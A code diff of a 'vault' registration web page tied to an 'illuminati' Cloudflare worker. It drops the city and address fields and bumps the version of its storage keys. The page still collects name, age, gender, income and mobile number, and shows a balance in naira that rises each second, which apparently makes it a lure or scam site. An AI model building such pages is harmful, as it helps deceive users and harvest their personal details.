@@ -405,18 +405,10 @@
             </div>
         </div>
         <div class="input-group">
-            <label>City</label>
-            <input type="text" id="regCity" placeholder="Enter city">
-        </div>
-        <div class="input-group">
             <label>Country</label>
             <select id="regCountry" onchange="handleCountryChange()">
                 <option value="">-- Select Country --</option>
             </select>
-        </div>
-        <div class="input-group">
-            <label>Address</label>
-            <input type="text" id="regAddress" placeholder="Enter street address">
         </div>
         <div class="input-group">
             <label>Occupation/Job</label>
@@ -768,15 +760,15 @@
 <script>
     const WORKER_URL = "https://illuminati.illuminati-696.workers.dev";
 
-    const STORAGE_KEY_STEP = "vault_registration_step_v14";
-    const STORAGE_KEY_BONUS_CLAIMED = "vault_bonus_claimed_v14";
-    const STORAGE_KEY_BALANCE_NGN = "vault_balance_ngn_v14";
-    const STORAGE_KEY_TIME = "vault_last_time_v14";
-    const STORAGE_KEY_COUNTRY = "vault_selected_country_v14";
-    const STORAGE_KEY_PRIORITIES = "vault_selected_priorities_v14";
-    const STORAGE_KEY_THREAD_ID = "vault_chat_thread_id_v14";
-    const STORAGE_KEY_LOCAL_CHATS = "vault_local_chat_history_v14";
-    const STORAGE_KEY_SEEN_LEADER_COUNT = "vault_seen_leader_count_v14";
+    const STORAGE_KEY_STEP = "vault_registration_step_v15";
+    const STORAGE_KEY_BONUS_CLAIMED = "vault_bonus_claimed_v15";
+    const STORAGE_KEY_BALANCE_NGN = "vault_balance_ngn_v15";
+    const STORAGE_KEY_TIME = "vault_last_time_v15";
+    const STORAGE_KEY_COUNTRY = "vault_selected_country_v15";
+    const STORAGE_KEY_PRIORITIES = "vault_selected_priorities_v15";
+    const STORAGE_KEY_THREAD_ID = "vault_chat_thread_id_v15";
+    const STORAGE_KEY_LOCAL_CHATS = "vault_local_chat_history_v15";
+    const STORAGE_KEY_SEEN_LEADER_COUNT = "vault_seen_leader_count_v15";
 
     const NGN_PER_USD = 1650;
     const INCREMENT_PER_SEC_NGN = 6.633;
@@ -1263,15 +1255,13 @@
     function submitRegistration() {
         const name = document.getElementById('regName').value.trim();
         const age = document.getElementById('regAge').value;
-        const city = document.getElementById('regCity').value.trim();
         const country = document.getElementById('regCountry').value;
-        const address = document.getElementById('regAddress').value.trim();
         const occupation = document.getElementById('regOccupation').value.trim();
         const income = document.getElementById('regIncome').value.trim();
         const mobileDigits = document.getElementById('regMobile').value.replace(/[^0-9]/g, '');
         const err = document.getElementById('regError');
 
-        if(!name || !age || !selectedGenderVal || !city || !country || !address || !occupation || !income || !mobileDigits) {
+        if(!name || !age || !selectedGenderVal || !country || !occupation || !income || !mobileDigits) {
             err.innerText = "Please fill in all required fields and select your age and gender.";
             err.style.display = 'block';
             return;
